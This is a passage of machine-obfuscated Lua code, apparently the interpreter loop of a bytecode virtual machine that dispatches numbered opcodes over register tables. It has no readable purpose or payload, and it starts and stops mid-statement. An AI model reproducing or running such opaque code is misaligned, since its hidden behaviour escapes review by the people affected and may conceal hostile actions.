then if ba<11 then n=n+1;else y=f[n];end else if ba<13 then n=y[131];else break end end end end ba=ba+1 end end;elseif z<=37 then local ba=0 while true do if(ba<=8)then if ba<=3 then if(ba<1 or ba==1)then if 0<ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else w={};end else if(ba>2)then y=f[n];else n=(n+1);end end else if(ba<=5)then if 5>ba then w[y[654]]=h[y[131]];else n=(n+1);end else if ba<=6 then y=f[n];else if(ba==7)then w[y[654]]=w[y[131]]+y[216];else n=n+1;end end end end else if(ba<12 or ba==12)then if(ba==10 or ba<10)then if 10~=ba then y=f[n];else h[y[131]]=w[y[654]];end else if 11<ba then y=f[n];else n=n+1;end end else if(ba==14 or ba<14)then if not(ba==14)then do return end;else n=n+1;end else if ba<=15 then y=f[n];else if ba>16 then break else do return end;end end end end end ba=ba+1 end elseif(z>38)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[654]]=w[y[131]][y[216]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[654]]=w[y[131]];end else if 6==ba then y=f[n];else w[y[654]]=h[y[131]];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if 11>ba then w[y[654]]=w[y[131]][w[y[216]]];else n=n+1;end end else if ba<=13 then if ba==12 then y=f[n];else bb=y[654]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end ba=ba+1 end else if(w[y[654]]<=w[y[216]])then n=n+1;else n=y[131];end;end;elseif(42==z or 42>z)then if(40==z or 40>z)then local ba=y[654]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if(be>=ba)then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end elseif(z>41)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[654]]=h[y[131]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba==4 then w[y[654]]=y[131];else n=n+1;end else if 7~=ba then y=f[n];else w[y[654]]=y[131];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if ba~=11 then w[y[654]]=y[131];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[654]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[131]))end end end end ba=ba+1 end else w[y[654]]=false;end;elseif(z==43 or z<43)then w[y[654]]=false;n=(n+1);elseif(44<z)then w[y[654]]=(w[y[131]]-w[y[216]]);else if(y[654]==w[y[216]]or y[654]<w[y[216]])then n=n+1;else n=y[131];end;end;elseif z<=68 then if 56>=z then if 50>=z then if 47>=z then if z==46 then local ba;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))else w[y[654]][y[131]]=w[y[216]];end;elseif 48>=z then local ba;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]][w[y[131]]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];ba=y[654]w[ba](r(w,ba+1,y[131]))elseif z>49 then local ba;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))else local ba=y[654]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[216]do bc=bc+1;w[bd]=bb[bc];end end;elseif 53>=z then if z<=51 then local ba;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba]()elseif 52<z then w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];else w[y[654]]=w[y[131]];end;elseif z<=54 then local ba;w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))elseif z~=56 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if w[y[654]]then n=n+1;else n=y[131];end;else local ba=y[654]local bb={w[ba](r(w,ba+1,y[131]))};local bc=0;for bd=ba,y[216]do bc=bc+1;w[bd]=bb[bc];end;end;elseif z<=62 then if z<=59 then if 57>=z then if(w[y[654]]<=w[y[216]])then n=y[131];else n=n+1;end;elseif 58<z then local ba;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))else local ba;local bb;local bc;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];bc=y[654]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[216]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=60 then local ba=w[y[216]];if not ba then n=n+1;else w[y[654]]=ba;n=y[131];end;elseif 62>z then local ba=y[654]w[ba]=w[ba]()else local ba=y[654]w[ba](r(w,ba+1,p))end;elseif z<=65 then if 63>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[654]]=h[y[131]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[654]]=h[y[131]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba<16 then bd=y[654]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 64<z then local ba;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))else h[y[131]]=w[y[654]];end;elseif 66>=z then local ba;w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))elseif z>67 then if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;else w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];end;elseif z<=80 then if z<=74 then if 71>=z then if(z<=69)then local ba,bb,bc,bd,be,bf=0 while true do if ba<=3 then if ba<=1 then if ba<1 then bb=y[654]else bc=y[216]end else if ba~=3 then bd=bb+2 else be={w[bb](w[bb+1],w[bd])}end end else if ba<=5 then if 5>ba then for bg=1,bc do w[bd+bg]=be[bg];end else bf=w[bb+3]end else if 6<ba then break else if bf then w[bd]=bf;n=y[131];else n=n+1 end;end end end ba=ba+1 end elseif(z>70)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[654]]=h[y[131]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[654]]=h[y[131]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[654]end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[654]]=h[y[131]];end end end else if ba<=6 then if ba>5 then w[y[654]]=h[y[131]];else y=f[n];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba~=16 then bd=y[654]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end end;elseif(z==72 or z<72)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba>0 then w[y[654]]=j[y[131]];else bb=nil end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba<7 then y=f[n];else w[y[654]]=y[131];end end else if ba<=8 then n=n+1;else if ba<10 then y=f[n];else w[y[654]]=y[131];end end end end else if ba<=15 then if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if ba<=13 then w[y[654]]=y[131];else if ba~=15 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[654]]=y[131];else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[654]else if ba==20 then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end end ba=ba+1 end elseif(73<z)then local ba=d[y[131]];local bb={};local bc={};for bd=1,y[216]do n=n+1;local be=f[n];if not(be[878]~=52)then bc[(bd-1)]={w,be[131],nil,nil,nil};else bc[(bd-1)]={h,be[131],nil};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[654]]=b(ba,bb,j);else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[654]]=w[y[131]][y[216]];else if 2~=ba then n=n+1;else y=f[n];end end else if ba<=4 then if ba==3 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 6~=ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if 13~=ba then if w[y[654]]then n=n+1;else n=y[131];end;else break end end end end ba=ba+1 end end;elseif 77>=z then if 75>=z then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba==2 then bd=nil else w[y[654]]=w[y[131]][y[216]];end end else if ba<=5 then if 5~=ba then n=n+1;else y=f[n];end else if 6<ba then n=n+1;else w[y[654]]=w[y[131]];end end end else if ba<=11 then if ba<=9 then if ba==8 then y=f[n];else w[y[654]]=h[y[131]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba<13 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba~=15 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 16<ba then y=f[n];else n=n+1;end else if 19>ba then w[y[654]]=h[y[131]];else n=n+1;end end else if ba<=21 then if 21>ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if ba<23 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba>24 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if ba>26 then bd=y[131];else y=f[n];end end else if ba<=29 then if 29~=ba then bc=y[216];else bb=k(w,g,bd,bc);end else if ba==30 then w[y[654]]=bb;else break end end end end end ba=ba+1 end elseif z==76 then local ba=y[654];w[ba]=w[ba]-w[ba+2];n=y[131];else if(w[y[654]]<=w[y[216]])then n=y[131];else n=n+1;end;end;elseif 78>=z then local ba;local bb;local bc;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];bc=y[654]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[216]do ba=ba+1;w[bd]=bb[ba];end elseif z<80 then local ba;local bb,bc;local bd;w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];bd=y[654]bb,bc=i(w[bd](r(w,bd+1,y[131])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;else if(y[654]<=w[y[216]])then n=n+1;else n=y[131];end;end;elseif 86>=z then if z<=83 then if z<=81 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[654]]=w[y[131]][y[216]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[654]]=h[y[131]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9<ba then w[y[654]]=h[y[131]];else y=f[n];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[654]else if 17==ba then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end end ba=ba+1 end elseif 82==z then w[y[654]][y[131]]=y[216];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];else local ba;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];ba=y[654]w[ba]=w[ba](r(w,ba+1,y[131]))end;elseif z<=84 then local ba;local bb;local bc;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];bc=y[131];bb=y[216];ba=k(w,g,bc,bb);w[y[654]]=ba;elseif z<86 then w[y[654]]=h[y[131]];else local ba=y[654];local bb=w[ba];for bc=ba+1,y[131]do t(bb,w[bc])end;end;elseif 89>=z then if z<=87 then local ba;local bb;local bc;w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][w[y[216]]];n=n+1;y=f[n];bc=y[654]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[216]do ba=ba+1;w[bd]=bb[ba];end elseif 88==z then local ba=d[y[131]];local bb={};local bc={};for bd=1,y[216]do n=n+1;local be=f[n];if be[878]==52 then bc[bd-1]={w,be[131]};else bc[bd-1]={h,be[131]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(m,m)local m=bc[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,bd)local m=bc[m]m[1][m[2]]=bd;end;});w[y[654]]=b(ba,bb,j);else local m;w[y[654]]=w[y[131]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))end;elseif z<=90 then w[y[654]][w[y[131]]]=w[y[216]];elseif 91<z then local m;local ba;w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]={r({},1,y[131])};n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];ba=y[654];m=w[ba];for bb=ba+1,y[131]do t(m,w[bb])end;else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;end;elseif z<=139 then if 115>=z then if 103>=z then if z<=97 then if(94>=z)then if not(z==94)then local m,ba=0 while true do if m<=14 then if m<=6 then if m<=2 then if m<=0 then ba=nil else if m>1 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end else if m<=4 then if 4>m then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if 6>m then n=n+1;else y=f[n];end end end else if m<=10 then if m<=8 then if m>7 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if 9<m then w[y[654]]=w[y[131]]*y[216];else y=f[n];end end else if m<=12 then if 11<m then y=f[n];else n=n+1;end else if 13==m then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end end end else if m<=22 then if m<=18 then if m<=16 then if 16>m then y=f[n];else w[y[654]]=j[y[131]];end else if m==17 then n=n+1;else y=f[n];end end else if m<=20 then if m>19 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if 22~=m then y=f[n];else w[y[654]]=w[y[131]];end end end else if m<=26 then if m<=24 then if 23<m then y=f[n];else n=n+1;end else if m>25 then n=n+1;else w[y[654]]=w[y[131]]+w[y[216]];end end else if m<=28 then if 27<m then ba=y[654]else y=f[n];end else if 29<m then break else w[ba]=w[ba](r(w,ba+1,y[131]))end end end end end m=m+1 end else local m,ba=0 while true do if m<=8 then if m<=3 then if m<=1 then if m>0 then w[y[654]]=w[y[131]][y[216]];else ba=nil end else if 3~=m then n=n+1;else y=f[n];end end else if m<=5 then if m<5 then w[y[654]]=h[y[131]];else n=n+1;end else if m<=6 then y=f[n];else if m~=8 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if m<=13 then if m<=10 then if 10~=m then y=f[n];else w[y[654]]=y[131];end else if m<=11 then n=n+1;else if m~=13 then y=f[n];else w[y[654]]=y[131];end end end else if m<=15 then if 14==m then n=n+1;else y=f[n];end else if m<=16 then ba=y[654]else if m<18 then w[ba]=w[ba](r(w,ba+1,y[131]))else break end end end end end m=m+1 end end;elseif(95==z or 95>z)then local m,ba=0 while true do if m<=16 then if m<=7 then if m<=3 then if m<=1 then if m~=1 then ba=nil else w[y[654]]=w[y[131]][y[216]];end else if 2<m then y=f[n];else n=n+1;end end else if m<=5 then if 4<m then n=n+1;else w[y[654]]=h[y[131]];end else if 6==m then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if m<=11 then if m<=9 then if 9~=m then n=n+1;else y=f[n];end else if m~=11 then w[y[654]]={};else n=n+1;end end else if m<=13 then if 12==m then y=f[n];else w[y[654]]=h[y[131]];end else if m<=14 then n=n+1;else if m<16 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end end else if m<=24 then if m<=20 then if m<=18 then if m<18 then n=n+1;else y=f[n];end else if 19==m then w[y[654]]=h[y[131]];else n=n+1;end end else if m<=22 then if m<22 then y=f[n];else w[y[654]]={};end else if 24~=m then n=n+1;else y=f[n];end end end else if m<=28 then if m<=26 then if 26~=m then w[y[654]]=h[y[131]];else n=n+1;end else if m~=28 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end else if m<=30 then if 29<m then y=f[n];else n=n+1;end else if m<=31 then ba=y[654]else if m<33 then w[ba]=w[ba]()else break end end end end end end m=m+1 end elseif(96<z)then local m,ba=0 while true do if m<=8 then if m<=3 then if m<=1 then if m<1 then ba=nil else w[y[654]]=w[y[131]][w[y[216]]];end else if m~=3 then n=n+1;else y=f[n];end end else if m<=5 then if 5>m then w[y[654]]=w[y[131]];else n=n+1;end else if m<=6 then y=f[n];else if m~=8 then w[y[654]]=y[131];else n=n+1;end end end end else if m<=13 then if m<=10 then if 10>m then y=f[n];else w[y[654]]=y[131];end else if m<=11 then n=n+1;else if 12<m then w[y[654]]=y[131];else y=f[n];end end end else if m<=15 then if m<15 then n=n+1;else y=f[n];end else if m<=16 then ba=y[654]else if m>17 then break else w[ba]=w[ba](r(w,ba+1,y[131]))end end end end end m=m+1 end else local m=y[654];local ba=w[y[131]];w[m+1]=ba;w[m]=ba[y[216]];end;elseif z<=100 then if z<=98 then if(w[y[654]]~=w[y[216]])then n=y[131];else n=n+1;end;elseif z>99 then local m;local ba;local bb;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];bb=y[654]ba={w[bb](w[bb+1])};m=0;for bc=bb,y[216]do m=m+1;w[bc]=ba[m];end else w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]={};n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if not w[y[654]]then n=n+1;else n=y[131];end;end;elseif z<=101 then local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];m=y[654]w[m]=w[m](w[m+1])elseif 103~=z then local m;w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];w[y[654]]=y[131];n=n+1;y=f[n];m=y[654]w[m]=w[m](r(w,m+1,y[131]))else if(w[y[654]]~=w[y[216]])then n=y[131];else n=n+1;end;end;elseif z<=109 then if z<=106 then if z<=104 then local m,ba=0 while true do if m<=8 then if m<=3 then if m<=1 then if 0<m then w[y[654]]=w[y[131]][y[216]];else ba=nil end else if m==2 then n=n+1;else y=f[n];end end else if m<=5 then if m==4 then w[y[654]]=h[y[131]];else n=n+1;end else if m<=6 then y=f[n];else if 8~=m then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if m<=13 then if m<=10 then if 9==m then y=f[n];else w[y[654]]=y[131];end else if m<=11 then n=n+1;else if 13~=m then y=f[n];else w[y[654]]=y[131];end end end else if m<=15 then if 15~=m then n=n+1;else y=f[n];end else if m<=16 then ba=y[654]else if m<18 then w[ba]=w[ba](r(w,ba+1,y[131]))else break end end end end end m=m+1 end elseif z==105 then local m,ba=0 while true do if m<=7 then if m<=3 then if m<=1 then if m>0 then w[y[654]]=h[y[131]];else ba=nil end else if 3>m then n=n+1;else y=f[n];end end else if m<=5 then if m==4 then w[y[654]]=y[131];else n=n+1;end else if 6==m then y=f[n];else w[y[654]]=y[131];end end end else if m<=11 then if m<=9 then if 9>m then n=n+1;else y=f[n];end else if m>10 then n=n+1;else w[y[654]]=y[131];end end else if m<=13 then if 13>m then y=f[n];else ba=y[654]end else if m>14 then break else w[ba]=w[ba](r(w,ba+1,y[131]))end end end end m=m+1 end else local m=0 while true do if m<=8 then if m<=3 then if m<=1 then if m<1 then a(c,e);else n=n+1;end else if m==2 then y=f[n];else w={};end end else if m<=5 then if 5>m then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else n=n+1;end else if m<=6 then y=f[n];else if m<8 then w[y[654]]=y[131];else n=n+1;end end end end else if m<=12 then if m<=10 then if 9<m then w[y[654]]=j[y[131]];else y=f[n];end else if 12~=m then n=n+1;else y=f[n];end end else if m<=14 then if m~=14 then w[y[654]]=j[y[131]];else n=n+1;end else if m<=15 then y=f[n];else if m<17 then w[y[654]]=w[y[131]][y[216]];else break end end end end end m=m+1 end end;elseif z<=107 then local m;w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=j[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]];n=n+1;y=f[n];m=y[654]w[m](r(w,m+1,y[131]))elseif 109>z then w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]][y[131]]=w[y[216]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];w[y[654]]=h[y[131]];n=n+1;y=f[n];w[y[654]]=w[y[131]][y[216]];n=n+1;y=f[n];if(w[y[654]]~=w[y[216]])then n=n+1;else n=y[131];end;else if(w[y[654]]~=y[216])then n=n+1;else n=y[131];end;end;elseif 112>=z then if 110>=z then local 